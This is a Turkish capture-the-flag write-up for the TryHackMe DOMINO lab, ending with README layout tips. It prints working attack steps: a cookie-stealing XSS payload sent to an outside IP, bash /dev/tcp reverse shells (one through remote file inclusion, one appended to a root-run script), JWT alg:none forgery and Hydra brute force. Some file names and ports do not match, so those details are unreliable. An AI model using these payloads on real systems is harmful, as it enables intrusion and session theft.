# TryHackMe — DOMINO

## Nmap ile Başlayalım

İlk olarak makinede hangi portların açık olduğunu görmek için klasik Nmap taramamı attım.

```bash
nmap -sS -A -p- 10.114.161.206
```

Tarama sonucunda özellikle iki port dikkatimi çekti:

```text
22/tcp   open  ssh
80/tcp   open  http
```

SSH'ın açık olması ileride işimize yarayabilir ama şu an elimizde bir kullanıcı adı ve parola olmadığı için ilk olarak web uygulamasına bakmak daha mantıklı.

> 📸 **Ekran görüntüsü:** Buraya Nmap çıktısının ekran görüntüsünü ekle.

---

## Web Sitesine Bakalım

80. portu tarayıcıdan açtığımda bir login ekranı karşıma çıktı.

Burada kullanıcı adı ve parola gerekiyor. Direkt brute force'a başlamadan önce uygulamada login olmadan erişebileceğimiz başka endpointler var mı diye kontrol etmek istedim.

Bunun için ffuf kullandım:

```bash
ffuf -u http://10.114.161.206/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

Tarama sonucunda birkaç ilginç dizin çıktı:

```text
/admin
/api
/backup
/javascript
/static
/support
```

Özellikle `backup`, `api` ve `static` dizinlerine bakmaya başladım.

> 📸 **Ekran görüntüsü:** Buraya ffuf çıktısını koy.

---

## Backup Dizininden Gelen İlk İpucu

`/backup/` dizinine girdiğimde bir `readme` dosyası karşıma çıktı.

Dosyada `config.enc` isimli şifrelenmiş bir config dosyasından bahsediliyordu. Ayrıca dosyanın çözülmesi için kullanılacak key'in `static/app.js` içerisinde olduğunu belirten bir bilgi vardı.

`static/app.js` dosyasını açtığımda şu bilgileri gördüm:

```javascript
apiBase: '/api'
_backupKey: 'N3xusK3y2024!!'
AES-ECB-128
```

Burada artık elimizde hem encryption algoritması hem de key vardı.

`N3xusK3y2024!!` değerini hex formatına çevirip OpenSSL ile dosyayı çözmeyi denedim:

```bash
openssl enc -d -aes-128-ecb -in config.enc -out config.dec -K 4e337875734b33793230323421210000
```

Daha sonra dosyanın gerçekten düzgün şekilde oluşup oluşmadığını kontrol ettim:

```bash
file config.dec
cat config.dec
```

Karşıma şu config çıktı:

```json
{
  "app_name": "NexusCorp Portal",
  "version": "2.3.1",
  "deploy_env": "production",
  "system_user": "devops"
}
```

Burada özellikle `devops` kullanıcı adına dikkat ettim. Şimdilik bir kenara not aldım.

> 📸 **Ekran görüntüsü:** `app.js` içerisindeki key ve `config.dec` çıktısını gösteren ekran görüntüsü.

---

## Kullanıcı İsimlerini Toplamak

Web sitesinde `Our Team` bölümünü fark ettim.

Burada çalışanların isimleri ve kullanıcı bilgileri listeleniyordu. Buradaki kullanıcı adlarını not alıp `users.txt` dosyasına koydum.

Elimizde artık login endpointi ve olası kullanıcı isimleri vardı. Bu yüzden parola denemesi yapmayı denedim.

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.114.161.206 http-post-form "/index.php:username=^USER^&password=^PASS^:F=Invalid"
```

Hydra sonucunda bazı geçerli kullanıcı bilgileri elde ettim.

Bunlardan biriyle web uygulamasına giriş yaptım.

> 📸 **Ekran görüntüsü:** Hydra'nın geçerli credential bulduğu kısmı buraya koy.

---

## Profile API'yi Kurcalayalım

Login olduktan sonra dashboard üzerinde `My Profile API` şeklinde bir bölüm gördüm.

Tıkladığımda şu URL açıldı:

```text
/profile.php?id=3
```

Burada `id` parametresi olduğu için aklıma direkt başka kullanıcıların ID'lerini deneyip deneyemeyeceğim geldi.

Örneğin:

```text
/profile.php?id=1
```

şeklinde değiştirmeye başladım.

Başka kullanıcıların profillerini görüntüleyebildiğimi fark ettim. Bir noktada admin kullanıcısının profilini de okuyabildim.

Admin kullanıcısının profil notlarında ilk flag vardı:

```text
THM{1d0r_h0r1z0nt4l_4cc3ss_fl4g1}
```

### Flag 1

`THM{1d0r_h0r1z0nt4l_4cc3ss_fl4g1}`

> 📸 **Ekran görüntüsü:** Admin profilindeki flag'in göründüğü bölüm.

---

## Ticket Sistemine Bakalım

Daha sonra dashboard'a geri dönüp `Open Ticket` bölümüne baktım.

Buradan yeni ticket oluşturabiliyordum. Bir ticket oluşturduğumda durumunun `Pending` olduğunu gördüm.

Bu noktada ticket'ın başka bir kullanıcı veya admin tarafından inceleniyor olabileceğini düşündüm.

Cookie'leri kontrol ettiğimde session cookie'sinde `HttpOnly` flag'inin aktif olmadığını fark ettim.

Bu önemliydi çünkü eğer ticket içeriği başka bir kullanıcı tarafından açılıyorsa JavaScript çalıştırmayı deneyebilirdim.

Basit bir XSS payload'ı hazırladım:

```html
<script>fetch("http://192.168.154.242:81/test.php?data="+btoa(document.cookie));</script>
```

Kendi makinemde gelen isteği dinlemek için listener açtım:

```bash
nc -nvlp 82
```

Ticket oluşturduktan sonra beklediğim istek geldi.

Gelen cookie içerisinde admin session'ına ait bilgi bulunuyordu:

```text
nexus_session=eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4ifQ==.2d1632df0b5a19cc9a8db3b2e72e612b0110c4e4aaed1265006b8c0bc73f6834
```

Bu cookie'yi kendi session'ımda kullanıp sayfayı yenilediğimde artık admin olarak giriş yapmış olduğumu gördüm.

Admin panelinde ikinci flag karşıma çıktı.

### Flag 2

`THM{bl1nd_x55_s3ss10n_h1j4ck_fl4g2}`

> 📸 **Ekran görüntüsü:** Cookie'nin geldiği Burp/terminal ekranı.

> 📸 **Ekran görüntüsü:** Admin panelinde ikinci flag'in göründüğü bölüm.

---

## API Tarafına Geçelim

Admin erişimini aldıktan sonra `/api/auth/token.php` endpointini incelemeye başladım.

Burada token ile ilgili önemli bir not vardı:

```text
Use this token as: Authorization: Bearer <token> for /api/files.php
```

Yani burada kullanılan token'ı cookie olarak değil, `Authorization` header'ı içerisinde göndermemiz gerekiyor.

İlk olarak elimdeki token ile API'ye istek attım:

```bash
curl -i -H "Authorization: Bearer <TOKEN>" http://10.114.161.206/api/files.php
```

Fakat beklediğim sonucu alamadım.

Token'ın yapısını inceleyince JWT formatında olduğunu gördüm. Burada JWT'nin algoritma kontrolünün nasıl yapıldığını test etmek istedim.

`alg` değerini `none` yaparak yeni bir token oluşturdum.

Payload içerisinde de admin rolünü belirttim:

```json
{"sub":"laura.hayes","role":"admin"}
```

Ortaya çıkan token:

```text
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYXVyYS5oYXllcyIsInJvbGUiOiJhZG1pbiJ9.
```

Bu token ile tekrar API'ye istek attım:

```bash
curl -i -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYXVyYS5oYXllcyIsInJvbGUiOiJhZG1pbiJ9." http://10.114.161.206/api/files.php
```

Bu sefer API isteği kabul etti.

Burada JWT doğrulamasında `alg:none` durumunun kabul edildiğini anladım.

> 📸 **Ekran görüntüsü:** JWT'nin `alg:none` olarak hazırlanması ve API'den başarılı response alınması.

---

## files.php'yi İnceleyelim

Artık `/api/files.php` endpointine erişebildiğimize göre parametreleri incelemeye başladım.

`name` parametresinin dosya adı/path aldığını gördüm.

Önce endpointin kendi kaynak kodunu okumayı denedim:

```bash
curl -s -H "Authorization: Bearer $TOKEN" "http://10.114.161.206/api/files.php?name=/var/www/html/api/files.php"
```

Burada önemli bir şey ortaya çıktı.

Endpoint, URL verilmesi durumunda uzak bir kaynaktan içerik çekiyor ve daha sonra bunu PHP olarak çalıştırıyordu.

Bu noktada bunun sadece dosya okuma olmadığını, uzak bir payload vererek komut çalıştırmaya kadar götürülebileceğini düşündüm.

---

## İlk Shell'i Almak

Önce kendi makinemde basit bir payload dosyası hazırladım.

`shell.txt`:

```php
system("bash -c 'bash -i >& /dev/tcp/192.168.154.242/4444 0>&1'");
```

Dosyayı hedef makinenin erişebileceği HTTP server üzerinden yayınladım:

```bash
python3 -m http.server 8000
```

Diğer terminalde shell için listener açtım:

```bash
nc -lvnp 4444
```

Daha sonra API üzerinden payload'ın URL'sini verdim:

```bash
curl -s -H "Authorization: Bearer $TOKEN" --get --data-urlencode "name=http://192.168.154.242:8000/payload.txt" http://10.114.161.206/api/files.php
```

Bir süre sonra listener'a bağlantı geldi.

İlk shell oldukça kısıtlıydı. Terminali biraz daha kullanılabilir hale getirmek için:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

ve:

```bash
export TERM=xterm-256color
```

komutlarını kullandım.

> 📸 **Ekran görüntüsü:** HTTP server + netcat listener + hedef shell'in geldiği terminal.

---

## RCE Sonrası

Shell aldıktan sonra sistemde biraz enumeration yapmaya başladım.

Önce `/opt` dizinine baktım:

```bash
ls -la /opt
```

Burada `flag3.txt` dosyasını gördüm.

```bash
cat /opt/flag3.txt
```

Flag:

```text
THM{rf1_2_rc3_f00th0ld_fl4g3}
```

### Flag 3

`THM{rf1_2_rc3_f00th0ld_fl4g3}`

> 📸 **Ekran görüntüsü:** `/opt/flag3.txt` çıktısı.

---

## DevOps Kullanıcısına Geçiş

RCE aldıktan sonra web uygulamasının PHP dosyalarını da incelemeye başladım.

`/var/www/html/` altında dikkatimi çeken bir PHP dosyası buldum.

Dosyada database bağlantısı için kullanılan bilgiler vardı:

```php
$DBDEF = array(
    'user' => 'app_user',
    'pwd' => 'D3v0ps!2024',
    'db' => 'nexusdb',
    'host' => 'localhost',
    'port' => '3306',
);
```

Buradaki parola oldukça dikkat çekiciydi.

Daha önce config dosyasında `devops` kullanıcısını görmüştüm. Sistemde gerçekten bu kullanıcı var mı diye baktım:

```bash
cat /etc/passwd
```

`devops` kullanıcısının mevcut olduğunu gördüm.

Parolayı `devops` hesabında denedim:

```bash
su devops
```

Parola olarak:

```text
D3v0ps!2024
```

kullandığımda kullanıcıya geçebildim.

Burada uygulamadaki credential'ın sistem kullanıcı hesabında da tekrar kullanıldığını görmüş olduk.

---

## DevOps Home Directory

DevOps kullanıcısına geçtikten sonra home dizinini kontrol ettim.

Burada dördüncü flag bulunuyordu:

```text
THM{s5h_cr3d_r3u53_l4t3r4l_f14g4}
```

### Flag 4

`THM{s5h_cr3d_r3u53_l4t3r4l_f14g4}`

> 📸 **Ekran görüntüsü:** DevOps home dizinindeki flag.

---

## Monitoring Script'i

Daha önce `/opt` altında `monitoring` dizinini görmüştüm.

Bu sefer devops kullanıcısıyla:

```bash
ls -la /opt/monitoring
```

komutunu çalıştırdım.

Burada `health_report.sh` isimli bir script vardı.

Dosyanın izinlerine baktığımda önemli bir durum gördüm. Script root tarafından çalıştırılıyor ancak devops grubunun dosya üzerinde yazma yetkisi bulunuyordu.

Yani script'in içerisine eklediğimiz herhangi bir komut, script root tarafından çalıştırıldığında root yetkisiyle çalışabilecekti.

Bu nedenle script'e kendi shell payload'ımı ekledim:

```bash
echo 'bash -i >& /dev/tcp/192.168.154.242/9999 0>&1' >> health_report.sh
```

Sonra kendi makinemde listener açtım:

```bash
nc -nvlp 9999
```

Script'in root tarafından çalıştırılmasını bekledim.

Bir süre sonra bağlantı geldi ve root shell elde ettim.

> 📸 **Ekran görüntüsü:** `ls -la /opt/monitoring` ile dosya izinlerinin göründüğü bölüm.

> 📸 **Ekran görüntüsü:** Root shell'in geldiği terminal.

---

## Son Flag

Artık root yetkimiz vardı.

Son olarak root flag'ini okuyarak makineyi tamamladım:

```bash
cat /root/root.txt
```

Son flag:

```text
THM{pr1v3sc_cr0n_r00t_fl4g5}
```

### Flag 5

`THM{pr1v3sc_cr0n_r00t_fl4g5}`

---

## Flagler

| # | Flag                                  |
| - | ------------------------------------- |
| 1 | `THM{1d0r_h0r1z0nt4l_4cc3ss_fl4g1}`   |
| 2 | `THM{bl1nd_x55_s3ss10n_h1j4ck_fl4g2}` |
| 3 | `THM{rf1_2_rc3_f00th0ld_fl4g3}`       |
| 4 | `THM{s5h_cr3d_r3u53_l4t3r4l_f14g4}`   |
| 5 | `THM{pr1v3sc_cr0n_r00t_fl4g5}`        |

## Kapanış

DOMINO'da benim için en güzel taraf saldırının tek bir açık üzerinden ilerlememesi oldu.

Başta sadece login ekranı vardı. Daha sonra ffuf ile bulduğumuz `backup` ve `static` dizinlerinden configuration bilgilerine ulaştık. Buradan kullanıcı isimlerini topladık ve geçerli bir hesaba ulaştık.

Login olduktan sonra profile API'deki `id` parametresini değiştirerek admin profilini okuyabildik. Ticket tarafındaki XSS ile admin session'ını elde ettikten sonra API'yi incelemeye başladık. JWT tarafındaki hatalı algoritma kontrolü sayesinde admin yetkili token oluşturabildik.

Sonrasında `files.php` üzerinden uzak içerik çalıştırılabildiğini fark ederek ilk shell'i aldık. Web dosyalarındaki credential reuse sayesinde `devops` kullanıcısına geçtik. Son aşamada ise root tarafından çalıştırılan fakat bizim grubumuz tarafından yazılabilen `health_report.sh` dosyasını kullanarak root shell elde ettik.

Makinedeki saldırı zinciri benim için özellikle şu noktaları tekrar göstermiş oldu: uygulamada bulunan küçük bir bilgi veya yanlış yapılandırma tek başına çok kritik görünmese bile, birkaç farklı bulgu birleştirildiğinde doğrudan root erişimine kadar giden bir zincir oluşturabiliyor.

---

### GitHub'a Koyarken Görsel Düzeni

README'yi daha temiz göstermek için ekran görüntülerini `images/` klasöründe tutmanı öneririm:

```text
DOMINO/
├── README.md
└── images/
    ├── 01-nmap.png
    ├── 02-ffuf.png
    ├── 03-backup.png
    ├── 04-config.png
    ├── 05-hydra.png
    ├── 06-idor.png
    ├── 07-xss.png
    ├── 08-admin.png
    ├── 09-jwt.png
    ├── 10-rce.png
    ├── 11-flag3.png
    ├── 12-devops.png
    ├── 13-monitoring.png
    └── 14-root.png
```

Metnin içinde de ilgili komutun hemen altına örneğin:

```markdown
![Nmap Scan](images/01-nmap.png)
```

şeklinde koyabilirsin.

Özellikle Nmap, ffuf, Hydra, IDOR, admin paneli, JWT, ilk shell, `health_report.sh` izinleri ve root shell ekran görüntülerini eklemen yeterli olur. Her komutun ekran görüntüsünü koymak README'yi gereksiz şekilde uzatır.
